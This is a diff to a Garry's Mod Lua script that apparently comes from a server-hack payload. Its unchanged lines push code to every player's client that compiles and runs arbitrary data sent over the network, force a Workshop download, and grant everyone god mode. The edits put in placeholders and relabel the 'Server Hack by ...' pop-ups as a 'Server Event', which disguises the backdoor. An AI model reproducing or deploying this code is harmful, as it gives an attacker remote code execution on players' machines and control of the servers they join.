@@ -25,7 +25,7 @@ BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()Com
 hook.Add("PlayerInitialSpawn", "Spawn", function(ply)
     if not ply:IsBot() then
         ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-        ply:SendLua([[steamworks.DownloadUGC(2033009436, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+        ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
     end
 end)
 
@@ -39,13 +39,13 @@ local len = #data
     net.Broadcast()
 end
 for k, v in pairs(player.GetAll()) do
-    v:SendLua([[steamworks.DownloadUGC(2033009436, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
+    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
 end
 
 -- Custom Settings
 timer.Simple(2.5, function()
     RunConsoleCommand("ulx", "god", "*")
-    PrecacheParticleSystem("lesheitan")
+    PrecacheParticleSystem("CHANGE_ME")
 end)
 
 timer.Simple( 5, function()
@@ -68,7 +68,7 @@ timer.Simple(5, function()
 InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
 InfoClient([[
     for i = 1, 10 do
-    ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
+    ParticleEffectAttach("CHANGE_ME", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
 end
 ]])
 end)
@@ -77,15 +77,15 @@ end)
 timer.Simple(5, function()
     InfoClient([[
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Server Hack by Kurama !", math.random(0, 4), 1.5 )
+    notification.AddLegacy( "Server Event by Kurama !", math.random(0, 4), 1.5 )
 end)
 
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Server Hack by TheCedoux !", math.random(0, 4), 1.5 )
+    notification.AddLegacy( "Server Event by TheCedoux !", math.random(0, 4), 1.5 )
 end)
 
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
-    notification.AddLegacy( "Server Hack by Doge Chien", math.random(0, 4), 1.5 )
+    notification.AddLegacy( "Server Event by Doge Chien", math.random(0, 4), 1.5 )
 end)
 
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
